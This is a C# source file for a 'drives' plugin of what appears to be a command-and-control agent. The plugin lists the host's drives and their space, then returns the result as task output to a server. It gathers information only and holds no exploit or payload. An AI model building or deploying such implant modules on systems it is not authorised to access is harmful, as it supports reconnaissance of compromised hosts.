using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Text;

namespace Agent
{
    public class DriveObject
    {
        public string DriveName { get; set; }
        public string DriveType { get; set; }
        public long FreeSpace { get; set; }
        public long TotalSpace { get; set; }
    }
    public class Plugin : IPlugin
    {
        public string Name => "drives";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.logger = logger;
        }

        public async Task Execute(ServerJob job)
        {
            Console.WriteLine("Getting Drives.");
            try
            {
                List<DriveObject> driveOutput = new List<DriveObject>();
                var drives = DriveInfo.GetDrives();
                foreach (var drive in drives)
                {
                    driveOutput.Add(new DriveObject()
                    {
                        DriveName = drive.Name,
                        DriveType = drive.DriveType.ToString(),
                        FreeSpace = drive.TotalFreeSpace / 1000000000,
                        TotalSpace = drive.TotalSize / 1000000000
                    });
                }

                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = JsonSerializer.Serialize(driveOutput),
                    completed = true
                });
            }
            catch (Exception e)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = e.ToString(),
                    completed = true
                });
            }
        }
    }
}
